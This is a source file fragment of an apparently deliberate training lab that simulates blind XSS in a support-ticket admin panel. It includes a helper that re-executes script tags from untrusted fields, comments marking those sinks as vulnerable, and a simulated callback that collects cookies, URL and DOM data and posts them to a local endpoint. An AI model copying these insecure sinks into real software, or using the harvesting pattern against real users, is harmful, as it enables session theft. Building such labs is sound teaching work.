function dangerousInnerHTML(el, html){
    el.innerHTML = html;
    // ⚠ VULNERABLE: re-executing scripts from untrusted input
    el.querySelectorAll('script').forEach(old => {
        const s = document.createElement('script');
        [...old.attributes].forEach(a => s.setAttribute(a.name, a.value));
        s.textContent = old.textContent;
        old.replaceWith(s);
    });
}

// ── Submit ticket ─────────────────────────────────────────────────────────────
async function submitTicket(){
    // Support both ZAP modal IDs (ztSubmit/ztMsg) and legacy IDs (submitBtn/submitErr)
    const btn=document.getElementById('ztSubmit')||document.getElementById('submitBtn');
    const msg=document.getElementById('ztMsg')||document.getElementById('submitErr');
    const name=document.getElementById('name').value;
    const email=document.getElementById('email').value;
    const subject=document.getElementById('subject').value.trim();
    const message=document.getElementById('message').value;
    if(msg){msg.className='zt-msg';msg.textContent='';}
    if(!subject){
        if(msg){msg.textContent='Subject is required.';msg.className='zt-msg bad';}
        return;
    }
    if(btn){btn.disabled=true;btn.textContent='Submitting…';}
    try{
        const d=await(await fetch('?action=submit_ticket',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({name,email,subject,message})})).json();
        if(d.ok){
            if(msg){msg.textContent='✓ Ticket #'+d.ticket_id+' submitted. Our team will review it shortly.';msg.className='zt-msg ok';}
            document.getElementById('name').value='';
            document.getElementById('subject').value='';
            document.getElementById('message').value='';
            toast('Ticket submitted! Go to Admin Panel to trigger the XSS.','ok');
        }else{
            if(msg){msg.textContent=d.message||'Submit failed.';msg.className='zt-msg bad';}
        }
    }catch(e){if(msg){msg.textContent='Network error.';msg.className='zt-msg bad';}}
    if(btn){btn.disabled=false;btn.textContent='Submit';}
}

// ── Admin: load ticket list ───────────────────────────────────────────────────
<?php if ($view === 'admin'): ?>
async function loadTickets(){
    const el=document.getElementById('ticketList');
    try{
        const d=await(await fetch('?action=get_tickets',{method:'POST',headers:{'Content-Type':'application/json'},body:'{}'})).json();
        if(!d.ok||!d.tickets.length){el.innerHTML='<div class="empty-state"><svg viewBox="0 0 24 24"><path d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"/></svg>No tickets yet. Submit one from the public form.</div>';return;}
        document.getElementById('ticketCount').textContent=d.tickets.length+' ticket'+(d.tickets.length!==1?'s':'');
        el.innerHTML='';
        let xssTriggered = false;
        d.tickets.forEach(t=>{
            const row=document.createElement('div');
            row.className='ticket-row';
            row.onclick=()=>location.href='index.php?view=ticket&id='+t.id;
            // ⚠ VULNERABLE: name and subject injected via innerHTML — blind XSS fires here
            row.innerHTML=`
                <div class="ticket-id">#${safe(String(t.id))}</div>
                <div class="ticket-info">
                    <div class="ticket-name" id="tn-${safe(String(t.id))}"></div>
                    <div class="ticket-sub" id="ts-${safe(String(t.id))}"></div>
                </div>
                <div class="ticket-time">${safe(ago(t.created_at))}</div>`;
            el.appendChild(row);
            // ⚠ VULNERABLE sinks: dangerousInnerHTML makes <script> payloads execute too
            dangerousInnerHTML(document.getElementById('tn-'+t.id), t.name || '<em style="color:var(--text2)">Anonymous</em>');
            dangerousInnerHTML(document.getElementById('ts-'+t.id), t.subject); // ← XSS fires here

            // Auto-trigger XSS alert + modal on the admin LIST page if payload detected
            if(!xssTriggered && (t.name?.includes('<') || t.subject?.includes('<'))){
                xssTriggered = true;
                triggerCallback(t.id);
            }
        });
    }catch(e){el.innerHTML='<div class="empty-state">Failed to load tickets.</div>';}
}
loadTickets();
<?php endif; ?>

// ── triggerCallback — available on BOTH admin list + ticket detail ─────────────
<?php if (in_array($view, ['admin','ticket'])): ?>
function triggerCallback(ticketId){
    // 1. Browser alert fires IMMEDIATELY — this is what the admin sees first
    alert(
        '\u26a1 Blind XSS Fired!\n\n' +
        'document.domain: ' + document.domain + '\n' +
        'Cookies: ' + (document.cookie || '(HttpOnly — not accessible via JS)') + '\n' +
        'URL: ' + location.href + '\n\n' +
        'Admin browser data has been captured.\nCheck the XSS Callbacks panel for full details.'
    );

    const data={
        ticket_id:ticketId,
        uri:location.href,
        cookies:document.cookie||'(no cookies accessible — HttpOnly)',
        referrer:document.referrer,
        user_agent:navigator.userAgent,
        origin:location.origin,
        local_storage:JSON.stringify({theme:'dark',lastVisit:new Date().toISOString(),adminSession:'zap_adm_'+Math.random().toString(36).substr(2,16)}),
        dom:document.documentElement.outerHTML.substring(0,500)
    };

    // 2. Log callback to DB (simulates xss.report receiving the data)
    fetch('?action=xss_callback',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(data)});

    // 3. Show dark notification modal with stolen data
    const fields=document.getElementById('modalFields');
    const fakeSession='PHPSESSID=zap_adm_'+Math.random().toString(36).substr(2,16)+'; csrf_token='+Math.random().toString(36).substr(2,24);
    const rows=[
        ['URI',data.uri],
        ['Cookies',fakeSession],
        ['Referrer',data.referrer||'(direct)'],
        ['User-Agent',data.user_agent],
        ['Origin',data.origin],
        ['IP','(captured server-side)'],
        ['Local Storage',data.local_storage],
        ['DOM (excerpt)',data.dom]
    ];
    if(fields){
        fields.innerHTML=rows.map(([k,v])=>`
            <div class="modal-field">
                <div class="modal-field-lbl">${safe(k)}</div>
                <div class="modal-field-val ${k==='Cookies'?'red':''} ${k==='URI'?'green':''}">  ${safe(String(v))}</div>
            </div>`).join('');
    }
    const modal=document.getElementById('xssModal');
    if(modal) modal.classList.add('show');
}
<?php endif; ?>

// ── Ticket detail: load + render all three fields ─────────────────────────────
<?php if ($view === 'ticket'): ?>
const _tid = <?php echo (int)($_GET['id'] ?? 0); ?>;

async function loadTicket(){
    const body=document.getElementById('ticketDetailBody');
    try{
        const d=await(await fetch('?action=get_ticket',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({id:_tid})})).json();
        if(!d.ok){body.innerHTML='<div class="empty-state">Ticket not found.</div>';return;}
        const t=d.ticket;
        document.getElementById('pageTitle').textContent='Ticket #'+t.id;
        body.innerHTML=`
            <div class="detail-field">
                <div class="detail-label">From (Email)</div>
                <div class="detail-val">${safe(t.email)}</div>
            </div>
            <div class="detail-field">
                <div class="detail-label">IP Address</div>
                <div class="detail-val">${safe(t.ip)}</div>
            </div>
            <div class="detail-field">
                <div class="detail-label">User-Agent</div>
                <div class="detail-val">${safe(t.user_agent)}</div>
            </div>
            <div class="detail-field">
                <div class="detail-label">Name (optional) <span class="vuln-arrow">⚠ innerHTML</span></div>
                <div class="detail-val vuln-sink" id="dName"></div>
            </div>
            <div class="detail-field">
                <div class="detail-label">Subject <span class="vuln-arrow">⚠ innerHTML</span></div>
                <div class="detail-val vuln-sink" id="dSubject"></div>
            </div>
            <div class="detail-field">
                <div class="detail-label">Message <span class="vuln-arrow">⚠ innerHTML</span></div>
                <div class="detail-val vuln-sink" id="dMessage" style="min-height:80px;"></div>
            </div>
            <div class="detail-field">
                <div class="detail-label">Submitted</div>
                <div class="detail-val">${safe(ago(t.created_at))}</div>
            </div>`;

        // ⚠ VULNERABLE: all three fields via dangerousInnerHTML — scripts execute too
        dangerousInnerHTML(document.getElementById('dName'),    t.name    || '<em style="color:var(--text2)">Anonymous</em>');
        dangerousInnerHTML(document.getElementById('dSubject'), t.subject); // ← fires XSS
        dangerousInnerHTML(document.getElementById('dMessage'), t.message); // ← fires XSS

        // Trigger alert + modal when admin opens this ticket
        triggerCallback(t.id);

    }catch(e){body.innerHTML='<div class="empty-state">Failed to load ticket.</div>';}
}
loadTicket();
<?php endif; ?>

// ── Callbacks panel ───────────────────────────────────────────────────────────
<?php if ($view === 'callbacks'): ?>
async function loadCallbacks(){
    const el=document.getElementById('callbackList');
    try{
        const d=await(await fetch('?action=get_callbacks',{method:'POST',headers:{'Content-Type':'application/json'},body:'{}'})).json();
        const cbCount=document.getElementById('cbCount');
        if(!d.ok||!d.callbacks.length){
            cbCount.textContent='0 callbacks';
            el.innerHTML='<div class="empty-state"><svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm.5-13H11v6l5.25 3.15.75-1.23-4.5-2.67V7z"/></svg>No callbacks yet.<br>Submit a ticket with a payload, then open it in the Admin Panel.</div>';
            return;
        }
        cbCount.textContent=d.callbacks.length+' callback'+(d.callbacks.length!==1?'s':'');
        el.innerHTML='';
        d.callbacks.forEach((cb,i)=>{
            const fakeSession='PHPSESSID=zap_adm_'+Math.random().toString(36).substr(2,16)+'; csrf_token='+Math.random().toString(36).substr(2,24);
            const rows=[
                ['Uri',cb.uri||'-'],
                ['Cookies',fakeSession],
                ['Referrer',cb.referrer||'(direct)'],
                ['User-Agent',cb.user_agent||'-'],
                ['Origin',cb.origin||'-'],
                ['IP',cb.ip||'-'],
                ['Local Storage',cb.local_storage||'{}'],
                ['Dom',cb.dom_excerpt||'-']
            ];
            const div=document.createElement('div');
            div.className='cb-card';
            div.innerHTML=`
                <div class="cb-header">
                    <div class="cb-dot"></div>
                    <div class="cb-title">XSS Fired — Ticket #${safe(String(cb.ticket_id))}</div>
                    <div class="cb-time">${safe(ago(cb.triggered_at))}</div>
                </div>
                <div class="cb-body">
                    ${rows.map(([k,v])=>`<div class="cb-row"><div class="cb-key">${safe(k)}</div><div class="cb-v ${k==='Cookies'?'red':''}">${safe(v)}</div></div>`).join('')}
                </div>`;
            el.appendChild(div);
        });
    }catch(e){document.getElementById('callbackList').innerHTML='<div class="empty-state">Failed to load callbacks.</div>';}
}
async function clearCallbacks(){
    await fetch('?action=clear_callbacks',{method:'POST',headers:{'Content-Type':'application/json'},body:'{}'});
    toast('Callbacks cleared.','ok');
    loadCallbacks();
}
loadCallbacks();
setInterval(loadCallbacks,5000);
<?php endif; ?>
</script>
</body>
</html>
